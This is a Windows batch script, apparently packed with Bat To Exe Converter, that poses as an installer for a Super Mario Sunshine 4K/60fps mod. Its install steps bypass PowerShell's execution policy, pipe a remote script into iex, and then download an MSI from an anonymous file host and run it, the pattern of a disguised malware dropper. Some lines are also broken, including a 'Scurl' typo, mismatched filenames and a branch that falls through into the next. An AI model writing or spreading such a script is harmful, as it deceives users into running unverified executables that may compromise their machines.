::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy+WQrEESVeYsRJzOyrGcbe0S+EzrOIU42GlSkcUJQRFNbQbmOgR6oG1N1g==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy++UqVkSRN4sdZyP0fqLOOVz
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color C
title RG Text Game
echo -------------------------------------------------
echo Welcome to the mario sunshine 4k/60 fps mod installer(credit to cooley)
echo.
echo -------------------------------------------------
echo.
echo.
echo.
cls
echo would you like to install the super mario sunshine 4k mod?
echo Choices: yes/no
set /p choice=
if /i "%choice%"=="no" GOTO asktoinstall4k60
if /i "%choice%"=="yes" GOTO installsms4k


:asktoinstall4k60
cls
echo would you like to install the super mario sunshine 4k mod with 60 fps instead?
echo Choices: yes/no
set /p choice=
if /i "%choice%"=="no" GOTO exit
if /i "%choice%"=="yes" GOTO installsms4k60


:installsms4k60
cls
powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
choco install 7zip --force -y
cd %USERPROFILE%\Documents
curl https://anonfiles.com/F0P3mbX3y7/SmS4k60_msi --output SmS4k60.msi
start "" SmS4k60.msi


:installsms4k
cls
powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
choco install 7zip --force -y
cd %USERPROFILE%\Documents
Scurl https://cdn-148.anonfiles.com/HcPdm1X6y4/a0bd5f79-1676076588/SmS4k.msi --output SmS4k4k.msi
start "" SmS4k.msi
exit


:exit
exit